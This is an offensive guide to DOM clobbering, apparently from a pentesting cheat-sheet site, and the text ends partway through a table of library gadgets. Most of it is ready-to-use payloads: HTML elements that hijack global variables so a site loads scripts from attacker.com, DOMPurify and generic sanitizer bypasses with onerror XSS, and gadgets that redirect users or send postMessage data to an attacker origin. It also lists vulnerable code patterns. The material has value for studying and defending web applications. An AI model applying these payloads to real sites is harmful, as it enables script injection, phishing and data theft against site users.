---
title: DOM Clobbering
description: Complete guide to DOM Clobbering attacks with payloads, HTML injection techniques, named property pollution, prototype chain abuse, library gadget exploitation, and privilege escalation through script execution.
navigation:
  icon: i-lucide-puzzle
  title: DOM Clobbering
---

## What is DOM Clobbering

DOM Clobbering is a technique where **HTML injection** is used to manipulate the Document Object Model (DOM) by creating elements whose `id` or `name` attributes **collide with JavaScript global variables, object properties, or API references**. When JavaScript code accesses `window.someVar` or `document.someForm`, a clobbered HTML element with `id="someVar"` or `name="someForm"` is returned instead of the expected value, **hijacking program logic** without executing any script directly.

::note
DOM Clobbering is a **CSP-friendly attack**. Because it uses only HTML elements (no `<script>` tags, no event handlers, no `javascript:` URIs), it **bypasses Content Security Policy** entirely. This makes it invaluable in environments where traditional XSS is blocked by strict CSP, HTML sanitizers, or WAF rules.
::

::card-group
  ::card
  ---
  title: Named Property Access
  icon: i-lucide-hash
  ---
  HTML elements with `id` or `name` become accessible as **global variables** via `window.elementId`. JavaScript code referencing `window.config` or `document.forms` can be hijacked by injecting elements with matching identifiers.
  ::

  ::card
  ---
  title: Nested Property Clobbering
  icon: i-lucide-layers
  ---
  Use `<form>`, `<iframe>`, `<object>`, and `<embed>` elements to clobber **nested properties** like `window.x.y` by nesting elements with matching `id` and `name` attributes. Enables deeper object pollution.
  ::

  ::card
  ---
  title: toString / valueOf Hijack
  icon: i-lucide-type
  ---
  Clobbered elements return **DOM objects** not strings. When coerced to string (concatenation, comparison, template literals), the element's `toString()` returns its `id`, `href`, or content. Control string values through **anchor `href`** attributes.
  ::

  ::card
  ---
  title: Library Gadgets
  icon: i-lucide-wrench
  ---
  Popular JavaScript libraries (jQuery, DOMPurify older versions, mermaid, etc.) contain **gadget code** that reads DOM properties susceptible to clobbering. Exploit library internals to achieve **script execution** from pure HTML injection.
  ::

  ::card
  ---
  title: CSP Bypass
  icon: i-lucide-shield-off
  ---
  DOM Clobbering requires **zero JavaScript execution** in the injected payload. Only HTML elements are inserted. This completely bypasses `script-src`, `default-src`, `unsafe-inline` restrictions and most **Content Security Policies**.
  ::

  ::card
  ---
  title: Prototype & API Pollution
  icon: i-lucide-bug
  ---
  Clobber built-in browser APIs, global functions, and object prototypes by overriding `document.getElementById`, `window.location`, or library configuration objects to **redirect logic flow**.
  ::
::

---

## How DOM Clobbering Works

::steps{level="3"}

### The Named Access Principle

The HTML specification states that elements with `id` or `name` attributes are accessible as **named properties** of the `window` and `document` objects. This is the browser behavior that makes clobbering possible.

```txt [Browser Behavior]
HTML:
  <img id="x">

JavaScript:
  window.x        → returns the <img> element
  document.x      → returns the <img> element (in some browsers)
  x               → returns the <img> element (global scope)

This is DEFINED behavior in the HTML spec, not a bug.
The vulnerability arises when application code RELIES on
window.x being undefined or being a specific value,
and an attacker can inject HTML to CREATE window.x.
```

### The Collision

When JavaScript checks `if (window.config)` or reads `window.config.url`, it expects either `undefined` or a JavaScript object set by the application. If an attacker injects `<a id="config" href="https://attacker.com">`, then `window.config` is now the `<a>` element, and `window.config.toString()` returns `https://attacker.com`.

```txt [Collision Example]
APPLICATION CODE:
  let url = window.defaultURL || "/fallback";
  fetch(url).then(...)

EXPECTED:
  window.defaultURL is undefined → url = "/fallback"

ATTACKER INJECTS:
  <a id="defaultURL" href="https://attacker.com/evil.js">

RESULT:
  window.defaultURL is now the <a> element
  When coerced to string → "https://attacker.com/evil.js"
  fetch("https://attacker.com/evil.js") → attacker controls response!
```

### String Coercion is Key

DOM elements are objects, not strings. But when JavaScript **coerces** them to strings (via concatenation, template literals, comparison, or string functions), specific elements return controllable values:

```txt [String Coercion Rules]
Element Type       toString() returns        Controllable via
─────────────────────────────────────────────────────────────
<a id="x">         href attribute            href="https://attacker.com"
<area id="x">      href attribute            href="https://attacker.com"
<form id="x">      URL of the page           Not directly controllable
<img id="x">       [object HTMLImageElement]  Not useful for strings
<div id="x">       [object HTMLDivElement]    Not useful for strings
<input id="x">     [object HTMLInputElement]  Not useful for strings
<object id="x">    data attribute (some)      data="value"

KEY: <a> and <area> elements are the PRIMARY tools
     for controlling string values in DOM Clobbering.
```

### Escalation to Code Execution

DOM Clobbering alone injects **HTML, not JavaScript**. But when clobbered values flow into **dangerous sinks** (`eval()`, `innerHTML`, `document.write()`, `script.src`, `fetch()`, `import()`), the attacker achieves code execution indirectly.

::

---

## Basic Clobbering Payloads

### Single Property Clobbering

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="id Attribute"}
  ```html [Payloads]
  <!-- Clobber window.x with an element -->
  <img id="x">
  <div id="x"></div>
  <input id="x">
  <form id="x"></form>
  <section id="x"></section>
  <a id="x" href="https://attacker.com">
  <textarea id="x">controlled content</textarea>

  <!-- Clobber with controllable string value -->
  <!-- Only <a> and <area> give controllable toString() -->
  <a id="x" href="https://attacker.com/payload">

  <!-- When JavaScript does: -->
  <!-- let val = window.x + ""; -->
  <!-- val === "https://attacker.com/payload" -->

  <!-- Multiple clobbering (HTMLCollection) -->
  <img id="x"><img id="x">
  <!-- window.x is now an HTMLCollection (array-like) -->
  <!-- window.x[0] = first <img>, window.x[1] = second <img> -->

  <!-- Clobber common variable names: -->
  <a id="config" href="https://attacker.com">
  <a id="settings" href="https://attacker.com">
  <a id="data" href="https://attacker.com">
  <a id="url" href="https://attacker.com">
  <a id="endpoint" href="https://attacker.com">
  <a id="baseUrl" href="https://attacker.com">
  <a id="apiUrl" href="https://attacker.com">
  <a id="callback" href="https://attacker.com">
  <a id="defaultUrl" href="https://attacker.com">
  <a id="redirectUrl" href="https://attacker.com">
  <a id="src" href="https://attacker.com/evil.js">
  <a id="source" href="https://attacker.com/evil.js">
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="name Attribute"}
  ```html [Payloads]
  <!-- name attribute clobbers on specific elements -->
  <!-- <embed>, <form>, <iframe>, <image>, <img>, <object> -->

  <form name="x"></form>
  <embed name="x">
  <object name="x"></object>
  <iframe name="x"></iframe>
  <img name="x">
  <image name="x">

  <!-- document.x works with name attribute -->
  <form name="myForm"></form>
  <!-- document.myForm → returns <form> element -->

  <!-- Named form elements also clobber: -->
  <form id="login">
    <input name="username" value="admin">
    <input name="password" value="secret">
  </form>
  <!-- document.login.username → <input> element -->
  <!-- document.login.username.value → "admin" -->

  <!-- iframe name clobbers window properties: -->
  <iframe name="x" src="about:blank"></iframe>
  <!-- window.x → returns the iframe's contentWindow -->
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Clobbering document Properties"}
  ```html [Payloads]
  <!-- Clobber document-level properties -->

  <!-- document.body -->
  <img id="body">
  <!-- document.body might return <img> instead of <body> -->

  <!-- document.forms -->
  <!-- Already a collection, but individual form access: -->
  <form name="login"></form>
  <!-- document.login → <form> element -->

  <!-- document.images / document.links / document.anchors -->
  <!-- These are live collections, harder to clobber directly -->

  <!-- document.cookie (not clobberable in modern browsers) -->
  <!-- document.domain (not clobberable) -->
  <!-- document.location (not clobberable directly) -->

  <!-- But document-level named access: -->
  <a name="x" href="https://attacker.com">
  <!-- document.x → <a> element in some browsers -->

  <!-- Clobber document.title: -->
  <img id="title">
  <!-- document.title might return <img> instead of title string -->
  <!-- (browser-dependent) -->
  ```
  :::
::

### Nested Property Clobbering

Two-level deep clobbering (`window.x.y`) requires **special element combinations** because most elements don't support nested named access.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="form + input/img"}
  ```html [Payloads]
  <!-- Clobber window.x.y using <form> + child elements -->

  <!-- window.x.y via form id + input/img name -->
  <form id="x">
    <input name="y" value="controlled">
  </form>
  <!-- window.x     → <form> element -->
  <!-- window.x.y   → <input> element -->
  <!-- window.x.y.value → "controlled" -->

  <!-- With controllable string (toString): -->
  <form id="x">
    <img name="y">
  </form>
  <!-- window.x.y → <img> element -->
  <!-- BUT <img>.toString() is "[object HTMLImageElement]" - not useful -->

  <!-- Solution: Use <button> with formaction for URL control -->
  <form id="x">
    <button name="y" formaction="https://attacker.com">
  </form>
  <!-- window.x.y.formAction → "https://attacker.com" -->

  <!-- Example: Clobber window.config.url -->
  <form id="config">
    <input name="url" value="https://attacker.com/evil">
  </form>
  <!-- window.config.url.value → "https://attacker.com/evil" -->

  <!-- Example: Clobber window.settings.apiKey -->
  <form id="settings">
    <input name="apiKey" value="attacker_controlled_key">
  </form>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="form + output/object"}
  ```html [Payloads]
  <!-- <output> element for text content clobbering -->
  <form id="x">
    <output name="y">attacker controlled text</output>
  </form>
  <!-- window.x.y → <output> element -->
  <!-- window.x.y.value → "attacker controlled text" -->
  <!-- window.x.y.textContent → "attacker controlled text" -->

  <!-- <object> element for nested clobbering -->
  <form id="x">
    <object name="y" data="https://attacker.com"></object>
  </form>
  <!-- window.x.y → <object> element -->

  <!-- <textarea> for multiline content -->
  <form id="x">
    <textarea name="y">arbitrary content here</textarea>
  </form>
  <!-- window.x.y.value → "arbitrary content here" -->

  <!-- Multiple nested properties via form -->
  <form id="config">
    <input name="debug" value="true">
    <input name="verbose" value="true">
    <input name="endpoint" value="https://attacker.com/api">
    <output name="key">ATTACKER_API_KEY</output>
  </form>
  <!-- window.config.debug.value → "true" -->
  <!-- window.config.endpoint.value → "https://attacker.com/api" -->
  <!-- window.config.key.value → "ATTACKER_API_KEY" -->
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="a + a (HTMLCollection)"}
  ```html [Payloads]
  <!-- Two <a> elements with same id create HTMLCollection -->
  <!-- The collection itself gets named property access via name -->

  <!-- Clobber window.x.y with controllable string: -->
  <a id="x"></a>
  <a id="x" name="y" href="https://attacker.com">

  <!-- window.x      → HTMLCollection [<a>, <a>] -->
  <!-- window.x.y    → second <a> element (name="y") -->
  <!-- window.x.y + "" → "https://attacker.com" (toString = href) -->

  <!-- This is the MOST POWERFUL technique: -->
  <!-- window.x.y gives controllable STRING (via href) -->

  <!-- Example: Clobber window.config.url -->
  <a id="config"></a>
  <a id="config" name="url" href="https://attacker.com/evil.js">
  <!-- window.config.url + "" → "https://attacker.com/evil.js" -->

  <!-- Example: Clobber window.defaults.source -->
  <a id="defaults"></a>
  <a id="defaults" name="source" href="https://attacker.com/payload">
  <!-- window.defaults.source + "" → "https://attacker.com/payload" -->

  <!-- Example: Clobber window.data.callback -->
  <a id="data"></a>
  <a id="data" name="callback" href="javascript:alert(1)">
  <!-- window.data.callback + "" → "javascript:alert(1)" -->
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="iframe + contentWindow"}
  ```html [Payloads]
  <!-- iframe's contentWindow provides another clobbering vector -->

  <iframe name="x" src="data:text/html,<a id='y' href='https://attacker.com'>"></iframe>
  <!-- window.x → iframe contentWindow -->
  <!-- window.x.y → <a> element inside iframe -->
  <!-- window.x.y + "" → "https://attacker.com" -->

  <!-- Deeper nesting via iframe chain: -->
  <iframe name="x" src="data:text/html,
    <iframe name='y' src='data:text/html,
      <a id=z href=https://attacker.com>'>
  "></iframe>
  <!-- window.x.y.z → "https://attacker.com" (3 levels deep!) -->

  <!-- NOTE: data: URIs may be blocked by CSP -->
  <!-- Alternative: srcdoc attribute -->
  <iframe name="x" srcdoc="<a id='y' href='https://attacker.com'>"></iframe>
  <!-- window.x.y + "" → "https://attacker.com" -->

  <!-- srcdoc with nested elements: -->
  <iframe name="config" srcdoc="
    <a id='apiUrl' href='https://attacker.com/api'>
    <a id='debug' href='true'>
  "></iframe>
  <!-- window.config.apiUrl + "" → "https://attacker.com/api" -->
  ```
  :::
::

### Three-Level Deep Clobbering

```html [Payloads]
<!-- Clobber window.x.y.z (3 levels) -->

<!-- Method 1: form + HTMLCollection inside form -->
<form id="x">
  <a name="y"></a>
  <a name="y" id="z" href="https://attacker.com">
</form>
<!-- window.x → <form> -->
<!-- window.x.y → HTMLCollection (name="y" matches 2 <a> elements) -->
<!-- window.x.y.z → <a id="z"> from the collection -->
<!-- window.x.y.z + "" → "https://attacker.com" -->

<!-- Method 2: iframe srcdoc chain -->
<iframe name="x" srcdoc="
  <form id='y'>
    <input name='z' value='attacker_value'>
  </form>
"></iframe>
<!-- window.x.y.z.value → "attacker_value" -->

<!-- Method 3: iframe + dual anchors -->
<iframe name="x" srcdoc="
  <a id='y'></a>
  <a id='y' name='z' href='https://attacker.com/payload'>
"></iframe>
<!-- window.x.y.z + "" → "https://attacker.com/payload" -->

<!-- Example: Clobber window.app.config.endpoint -->
<form id="app">
  <a name="config"></a>
  <a name="config" id="endpoint" href="https://attacker.com/api">
</form>
<!-- window.app.config.endpoint + "" → "https://attacker.com/api" -->
```

---

## Vulnerable Code Patterns

Identifying **which JavaScript patterns** are vulnerable to DOM Clobbering is critical for finding exploitable targets.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Global Variable Checks"}
  ```javascript [Vulnerable Patterns]
  // Pattern 1: Default value with OR operator
  let url = window.defaultURL || "/fallback";
  // Clobber: <a id="defaultURL" href="https://attacker.com">
  // Result: url = <a> element, coerced to "https://attacker.com"

  // Pattern 2: typeof check
  if (typeof config !== "undefined") {
    fetch(config.endpoint);
  }
  // Clobber: <a id="config"></a><a id="config" name="endpoint" href="https://attacker.com">
  // typeof <element> === "object" (not "undefined") → enters branch

  // Pattern 3: Truthiness check
  if (window.analytics) {
    loadScript(window.analytics.src);
  }
  // Clobber: <a id="analytics"></a><a id="analytics" name="src" href="https://attacker.com/evil.js">
  // DOM element is truthy → loads attacker's script

  // Pattern 4: Nullish coalescing
  const base = window.BASE_URL ?? "https://default.com";
  // Clobber: <a id="BASE_URL" href="https://attacker.com">
  // Element is not null/undefined → uses attacker URL

  // Pattern 5: Hasty variable assignment
  var GLOBAL_CONFIG = GLOBAL_CONFIG || {};
  GLOBAL_CONFIG.apiKey = GLOBAL_CONFIG.apiKey || "default_key";
  // Clobber: <form id="GLOBAL_CONFIG"><input name="apiKey" value="attacker_key">
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Property Access"}
  ```javascript [Vulnerable Patterns]
  // Pattern 1: Direct property read
  let value = someObject.property;
  // If someObject is clobbered → property access on DOM element

  // Pattern 2: Optional chaining (still vulnerable!)
  let val = window.config?.url;
  // Clobber: <a id="config"></a><a id="config" name="url" href="...">
  // window.config exists (HTMLCollection) → .url accessed

  // Pattern 3: Destructuring
  const { url, key } = window.appConfig || {};
  // Clobber: <form id="appConfig"><input name="url" value="evil">
  // Destructuring reads named properties from clobbered form

  // Pattern 4: for...in loop
  for (let key in window.settings) {
    processOption(key, window.settings[key]);
  }
  // Clobber: <form id="settings"><input name="debug" value="true">
  // Iterates over form's named elements

  // Pattern 5: JSON-like access
  let parsed = window.jsonData;
  if (parsed && parsed.items) {
    parsed.items.forEach(item => render(item));
  }
  // Clobber: <form id="jsonData"><select name="items"><option>...</select></form>
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Dangerous Sinks"}
  ```javascript [Vulnerable Patterns]
  // Pattern 1: Dynamic script loading
  let src = window.scriptUrl || "/default.js";
  let s = document.createElement("script");
  s.src = src;  // <-- SINK: controlled by clobbered value
  document.body.appendChild(s);
  // Clobber: <a id="scriptUrl" href="https://attacker.com/evil.js">
  // Result: Loads and executes attacker's JavaScript!

  // Pattern 2: innerHTML assignment
  let template = window.headerHTML || "<h1>Default</h1>";
  document.getElementById("header").innerHTML = template;
  // Clobber: <a id="headerHTML" href="javascript:alert(1)">
  // Less direct, but if toString() result used as HTML...

  // Pattern 3: eval / Function constructor
  let code = window.initCode || "console.log('init')";
  eval(code);  // <-- If clobbered value becomes string → RCE
  // Clobber: <a id="initCode" href='test"-alert(1)-"'>
  // Less likely, but possible with specific coercion paths

  // Pattern 4: document.write
  document.write(window.banner || "<p>Welcome</p>");
  // Clobber: <img id="banner">
  // Writes "[object HTMLImageElement]" - not directly useful
  // BUT with <a>: <a id="banner" href="javascript:alert(1)">
  // document.write("javascript:alert(1)") - context dependent

  // Pattern 5: URL construction
  fetch(window.API_BASE + "/users");
  // Clobber: <a id="API_BASE" href="https://attacker.com">
  // fetch("https://attacker.com/users")
  // Attacker controls API requests!

  // Pattern 6: import() dynamic import
  let module = window.modulePath || "./default.mjs";
  import(module).then(m => m.init());
  // Clobber: <a id="modulePath" href="https://attacker.com/evil.mjs">
  // Dynamically imports attacker's JavaScript module!
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Library Configuration"}
  ```javascript [Vulnerable Patterns]
  // Pattern 1: Library reads global config
  // Many libraries check for global configuration objects:
  
  // jQuery plugins:
  $.fn.myPlugin.defaults = window.PLUGIN_CONFIG || {};
  // Clobber: <form id="PLUGIN_CONFIG"><input name="url" value="evil">

  // Analytics libraries:
  if (window.analyticsConfig) {
    initAnalytics(window.analyticsConfig);
  }
  // Clobber: <a id="analyticsConfig" href="https://attacker.com/track">

  // Webpack public path:
  __webpack_public_path__ = window.CDN_URL || "/static/";
  // Clobber: <a id="CDN_URL" href="https://attacker.com/cdn/">
  // ALL dynamic imports now load from attacker's server!

  // Pattern 2: Feature flags / toggles
  if (window.FEATURES && window.FEATURES.newUI) {
    loadNewUI();
  }
  // Clobber: <form id="FEATURES"><img name="newUI">
  // Forces application into different code path

  // Pattern 3: Template engine config
  let templateUrl = window.TEMPLATE_BASE + "/header.html";
  // Clobber: <a id="TEMPLATE_BASE" href="https://attacker.com/templates">
  // Loads template from attacker server → template injection
  ```
  :::
::

---

## Advanced Clobbering Techniques

### Clobbering document.getElementById

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Shadowing getElementById"}
  ```html [Payloads]
  <!-- Override document.getElementById itself -->
  <!-- If code does: document.getElementById("target") -->
  <!-- And we can clobber "getElementById" on document... -->

  <!-- Using <form name="getElementById"> won't work directly -->
  <!-- But we can clobber ELEMENTS that getElementById returns: -->

  <!-- Original code expects: -->
  <!-- let el = document.getElementById("output"); -->
  <!-- el.innerHTML = sanitizedContent; -->

  <!-- Attacker injects BEFORE the real element: -->
  <div id="output">
    <img src=x onerror=alert(1)>
  </div>
  <!-- If there are two elements with id="output" -->
  <!-- getElementById returns the FIRST one (attacker's) -->
  <!-- Attacker controls what gets written to -->

  <!-- More subtle: Clobber the TARGET of innerHTML assignment -->
  <!-- If code does: document.getElementById("safe").innerHTML = userInput -->
  <!-- And DOMPurify sanitizes userInput... -->
  <!-- But if we can redirect WHERE it's written... -->
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Clobbering document.body"}
  ```html [Payloads]
  <!-- document.body can be partially clobbered -->
  <!-- via img elements with id/name="body" -->
  
  <!-- If JavaScript does: -->
  <!-- document.body.setAttribute("class", userInput) -->
  
  <!-- Clobber document.body: -->
  <img name="body" id="body">
  
  <!-- Now document.body might return <img> -->
  <!-- setAttribute on <img> instead of <body> -->
  
  <!-- Clobbering document properties via embed/object: -->
  <object id="cookie"></object>
  <!-- document.cookie might be affected in older browsers -->
  <!-- Modern browsers protect critical properties -->
  
  <!-- Clobber document.forms: -->
  <img id="forms">
  <!-- document.forms might return <img> instead of FormCollection -->
  ```
  :::
::

### Clobbering with HTMLCollection Properties

```html [Payloads]
<!-- HTMLCollections have special named access -->
<!-- When multiple elements share an id, they form an HTMLCollection -->
<!-- The collection supports named property access via name attributes -->

<!-- Clobber window.x to be an HTMLCollection: -->
<a id="x"></a>
<a id="x" name="value" href="attacker_value">
<a id="x" name="toString" href="https://attacker.com">
<a id="x" name="valueOf" href="42">

<!-- window.x.value + ""   → "attacker_value" -->
<!-- window.x.toString + "" → "https://attacker.com" -->

<!-- Clobber length property: -->
<a id="x"></a>
<a id="x" name="length" href="999">
<!-- window.x.length → MIGHT be clobbered (browser-dependent) -->
<!-- Usually returns collection length (2), not the named element -->

<!-- Clobber item() method: -->
<a id="x"></a>
<a id="x" name="item" href="https://attacker.com">
<!-- window.x.item → <a> element instead of function -->
<!-- If code does: window.x.item(0) → TypeError (not a function) -->
<!-- This can cause DoS or change execution flow -->

<!-- Real-world pattern: -->
<!-- Library code: -->
<!-- if (window.x && window.x.length) { -->
<!--   for (var i = 0; i < window.x.length; i++) { -->
<!--     process(window.x.item(i)); -->
<!--   } -->
<!-- } -->
```

### Clobbering attributes Property

```html [Payloads]
<!-- Many sanitizers check element.attributes -->
<!-- If attributes is clobbered, sanitizer may fail -->

<form id="target">
  <input name="attributes">
</form>

<!-- Now target.attributes returns <input> instead of NamedNodeMap -->
<!-- A sanitizer checking: -->
<!-- for (let attr of el.attributes) { ... } -->
<!-- → TypeError: el.attributes is not iterable -->
<!-- → Sanitizer crash → unsanitized content passes through! -->

<!-- Clobber other DOM API properties: -->
<form id="target">
  <input name="children">
  <input name="firstChild">
  <input name="lastChild">
  <input name="parentNode">
  <input name="innerHTML">
  <input name="outerHTML">
  <input name="textContent">
  <input name="nodeType">
  <input name="nodeName">
  <input name="tagName">
  <input name="classList">
  <input name="className">
  <input name="style">
  <input name="hasAttribute">
  <input name="getAttribute">
  <input name="setAttribute">
  <input name="removeAttribute">
</form>

<!-- target.children → <input name="children"> (not HTMLCollection!) -->
<!-- target.innerHTML → <input name="innerHTML"> (not string!) -->
<!-- target.tagName → <input name="tagName"> (not "FORM"!) -->

<!-- This breaks virtually ALL DOM manipulation libraries -->
```

---

## DOMPurify & Sanitizer Bypass

::caution
DOM Clobbering is one of the primary techniques used to **bypass HTML sanitizers** including DOMPurify. Older versions were particularly vulnerable. Always test with the **exact version** deployed on the target.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="DOMPurify Bypass (Historical)"}
  ```html [Payloads]
  <!-- DOMPurify < 2.0.17 bypasses via DOM Clobbering -->

  <!-- CVE-2020-26870 / DOMPurify < 2.0.17 -->
  <!-- Clobber DOMPurify's internal 'removed' array -->
  <form id="DOMPurify">
    <input name="removed">
  </form>
  <!-- DOMPurify.removed gets clobbered -->
  <!-- Sanitizer fails to track removed elements -->

  <!-- Bypass via clobbering document.body: -->
  <math><mtext><table><mglyph><style><!--</style>
  <img id="body" src=x onerror=alert(1)>
  <!-- Mutation XSS combined with clobbering -->

  <!-- DOMPurify <= 2.3.x namespace confusion: -->
  <math><mtext><table><mglyph><style><img src=x onerror=alert(1)>

  <!-- DOMPurify <= 3.0.x clobbering gadget: -->
  <form>
    <math><mtext></mtext><form>
      <img name="textContent" src=x onerror=alert(1)>
    </form>
  </math></form>

  <!-- Always test with:
       1. Exact DOMPurify version on target
       2. Latest known bypasses
       3. Mutation XSS + clobbering combinations -->
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Generic Sanitizer Bypass"}
  ```html [Payloads]
  <!-- Break sanitizer's element inspection -->

  <!-- Clobber attributes enumeration -->
  <form>
    <input name="attributes">
    <img src=x onerror=alert(1)>
  </form>
  <!-- If sanitizer iterates form.attributes → gets <input> not NamedNodeMap -->
  <!-- Sanitizer crashes → img passes through unsanitized -->

  <!-- Clobber nodeName/tagName -->
  <form>
    <input name="nodeName" value="SPAN">
    <input name="tagName" value="SPAN">
    <img src=x onerror=alert(1)>
  </form>
  <!-- Sanitizer checking form.nodeName gets <input> (truthy) -->
  <!-- Type confusion → wrong allowlist check -->

  <!-- Clobber children/childNodes -->
  <form>
    <input name="children">
    <input name="childNodes">
    <script>alert(1)</script>
  </form>
  <!-- form.children → <input> (not HTMLCollection of children) -->
  <!-- Sanitizer can't iterate child nodes → script passes through -->

  <!-- Clobber parentNode for tree traversal break -->
  <form>
    <input name="parentNode">
    <img src=x onerror=alert(1)>
  </form>
  <!-- If sanitizer does: el.parentNode.removeChild(el) -->
  <!-- parentNode is <input> → removeChild fails → element stays -->

  <!-- Clobber hasAttribute / getAttribute -->
  <form>
    <input name="hasAttribute">
    <input name="getAttribute">
    <a href="javascript:alert(1)">click</a>
  </form>
  <!-- Sanitizer: if (el.hasAttribute("href")) → gets <input> (truthy, but not a function) -->
  <!-- TypeError → sanitizer skips href check → javascript: URI passes -->
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Mutation XSS + Clobbering"}
  ```html [Payloads]
  <!-- Mutation XSS: Browser re-parses HTML differently than sanitizer -->
  <!-- Combined with clobbering for maximum effect -->

  <!-- Namespace confusion (SVG/MathML): -->
  <svg><svg>
    <style><img id="x" src=x onerror=alert(1)>
  </svg></svg>
  <!-- Sanitizer sees <style> content as text -->
  <!-- Browser re-parses after insertion → <img> becomes live element -->

  <!-- MathML namespace: -->
  <math><mtext>
    <table><mglyph><style>
      <img src=x onerror=alert(1)>
    </style></mglyph></table>
  </mtext></math>

  <!-- Noscript confusion: -->
  <noscript><img src=x onerror=alert(1)></noscript>
  <!-- Sanitizer (with scripting disabled): sees content as text -->
  <!-- Browser (with scripting enabled): ignores <noscript> content -->
  <!-- Depends on sanitizer's scripting flag -->

  <!-- Template element: -->
  <template><img src=x onerror=alert(1)></template>
  <!-- Content inside <template> is inert (not rendered) -->
  <!-- But if moved to document body via script → becomes live -->
  ```
  :::
::

---

## Library Gadgets

Real-world DOM Clobbering exploits almost always target **existing JavaScript code** (gadgets) that reads clobberable DOM properties and feeds them into dangerous sinks.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Script Source Gadgets"}
  ```javascript [Gadget Patterns]
  // GADGET 1: Dynamic script loading from global
  // Found in: analytics loaders, plugin systems, module loaders
  
  (function() {
    var src = window.ANALYTICS_URL || "https://analytics.default.com/script.js";
    var s = document.createElement("script");
    s.src = src;
    document.head.appendChild(s);
  })();
  
  // CLOBBER:
  // <a id="ANALYTICS_URL" href="https://attacker.com/evil.js">
  // RESULT: Loads and executes attacker's JavaScript!

  // ─────────────────────────────────────────────────

  // GADGET 2: Webpack chunk loading
  // __webpack_public_path__ is often set from global
  
  __webpack_public_path__ = window.CDN_BASE || "/dist/";
  // Later: import("./module") → fetches from CDN_BASE + "module.js"
  
  // CLOBBER:
  // <a id="CDN_BASE" href="https://attacker.com/dist/">
  // ALL dynamic imports now load from attacker's CDN!

  // ─────────────────────────────────────────────────

  // GADGET 3: jQuery $.getScript
  // Application code:
  var scriptPath = window.pluginScript || "/plugins/default.js";
  $.getScript(scriptPath);
  
  // CLOBBER:
  // <a id="pluginScript" href="https://attacker.com/evil.js">
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="URL/Fetch Gadgets"}
  ```javascript [Gadget Patterns]
  // GADGET 1: API base URL
  const API = window.API_CONFIG?.baseUrl || "https://api.default.com";
  fetch(API + "/users/me")
    .then(r => r.json())
    .then(data => renderProfile(data));
  
  // CLOBBER:
  // <a id="API_CONFIG"></a>
  // <a id="API_CONFIG" name="baseUrl" href="https://attacker.com">
  // Result: fetch("https://attacker.com/users/me")
  // Attacker serves fake API response → controls rendered data!

  // ─────────────────────────────────────────────────

  // GADGET 2: Image/resource source
  let logo = window.brandConfig?.logoUrl || "/images/logo.png";
  document.getElementById("logo").src = logo;
  
  // CLOBBER:
  // <a id="brandConfig"></a>
  // <a id="brandConfig" name="logoUrl" href="https://attacker.com/phishing.png">
  // Changes displayed logo to phishing image

  // ─────────────────────────────────────────────────

  // GADGET 3: Redirect URL
  if (window.redirectTarget) {
    window.location = window.redirectTarget;
  }
  
  // CLOBBER:
  // <a id="redirectTarget" href="https://attacker.com/phishing">
  // Redirects user to phishing page!

  // ─────────────────────────────────────────────────

  // GADGET 4: postMessage target origin
  parent.postMessage(sensitiveData, window.PARENT_ORIGIN || "*");
  
  // CLOBBER:
  // <a id="PARENT_ORIGIN" href="https://attacker.com">
  // Sensitive data sent to attacker's origin via postMessage!
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="innerHTML Gadgets"}
  ```javascript [Gadget Patterns]
  // GADGET 1: Template from global
  let template = window.headerTemplate || "<h1>Welcome</h1>";
  document.getElementById("header").innerHTML = template;
  
  // Direct clobbering with <a> gives URL string (limited HTML control)
  // BUT if application does string operations:
  // template.replace("Welcome", username) → might work with specific URL

  // ─────────────────────────────────────────────────

  // GADGET 2: Conditional rendering
  if (window.showBanner) {
    let bannerHtml = window.bannerContent || "<div>Default banner</div>";
    document.body.insertAdjacentHTML("afterbegin", bannerHtml);
  }
  
  // CLOBBER:
  // <img id="showBanner">  <!-- makes condition truthy -->
  // Now bannerContent is undefined → uses default
  // BUT if we clobber bannerContent too...
  // <a id="bannerContent" href="javascript:alert(1)">
  // innerHTML of "javascript:alert(1)" isn't directly dangerous
  // UNLESS further processing occurs

  // ─────────────────────────────────────────────────

  // GADGET 3: Error message rendering
  try { ... } catch(e) {
    let errorDiv = window.errorContainer || "errorBox";
    document.getElementById(errorDiv).innerHTML = e.message;
  }
  
  // If we can clobber errorContainer AND control error message...
  // More complex chain, but possible
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Real-World Gadgets"}
  ```txt [Known Library Gadgets]
  # Known DOM Clobbering gadgets in popular libraries:

  ┌─────────────────┬─────────────────────────────────────────────┐
  │ Library         │ Clobberable Property / Gadget               │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ Google reCAPTCHA│ window.___grecaptcha_cfg                    │
  │                 │ Clobber to control reCAPTCHA callback URL   │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ Google Analytics│ window.ga / window.gtag                     │
  │                 │ Clobber analytics configuration              │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ Mermaid.js      │ window.mermaid / globalConfig               │
  │                 │ Clobber to load external scripts             │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ Webpack         │ __webpack_public_path__                      │
  │                 │ Controls dynamic import base URL             │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ Vite            │ __vite__mapDeps / __vite_public_path__      │
  │                 │ Dynamic import path manipulation             │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ HLS.js          │ window.Hls.DefaultConfig                    │
  │                 │ Override media loading configuration         │
  ├─────────────────┼─────────────────────────────────────────────┤
  │ sanitize-html   │ Various internal property reads              │
